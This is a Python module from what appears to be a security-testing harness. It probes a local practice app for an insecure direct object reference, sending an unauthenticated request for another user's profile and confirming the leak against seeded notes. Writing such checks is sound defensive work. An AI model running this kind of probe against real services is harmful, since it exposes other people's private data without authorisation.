# sentinel/attacks/idor.py
"""
F-02: Insecure Direct Object Reference on /profile/{user_id}.

Strategy: hit another user's profile with zero authentication, no
token, no session, nothing. If we get their real notes back, there's
no ownership check at all. To make this airtight, we confirm the
returned content actually matches bob's seeded notes rather than just
checking for a 200 status.
"""
import requests

FINDING_ID = "F-02"
TITLE = "Broken Object-Level Access Control (IDOR) on Profile Endpoint"
SEVERITY = "High"
AFFECTED_COMPONENT = "target_app/routes/profile.py :: GET /profile/{user_id}"

TARGET_USER_ID = 2  # bob, seeded with known notes we can check for
EXPECTED_SIGNATURE = "shopping list"  # substring from bob's seeded note content


def attack(base_url: str = "http://localhost:8001") -> dict:
    result = {
        "finding_id": FINDING_ID,
        "title": TITLE,
        "severity": SEVERITY,
        "affected_component": AFFECTED_COMPONENT,
        "vulnerable": False,
        "evidence": None,
        "error": None,
    }

    try:
        # deliberately no auth header, no session, no cookie
        r = requests.get(f"{base_url}/profile/{TARGET_USER_ID}", timeout=5)
    except requests.RequestException as e:
        result["error"] = f"Could not reach target: {e}"
        return result

    if r.status_code != 200:
        return result  # endpoint blocked us, not vulnerable (or fixed)

    body = r.json()
    notes = body.get("notes", [])
    returned_user_id = body.get("user_id")

    leaked_someone_elses_data = (
        returned_user_id == TARGET_USER_ID
        and any(EXPECTED_SIGNATURE in note.get("content", "") for note in notes)
    )

    result["vulnerable"] = leaked_someone_elses_data
    if result["vulnerable"]:
        result["evidence"] = {
            "requested_without_auth_as": TARGET_USER_ID,
            "response": body,
        }

    return result


if __name__ == "__main__":
    import json
    print(json.dumps(attack(), indent=2))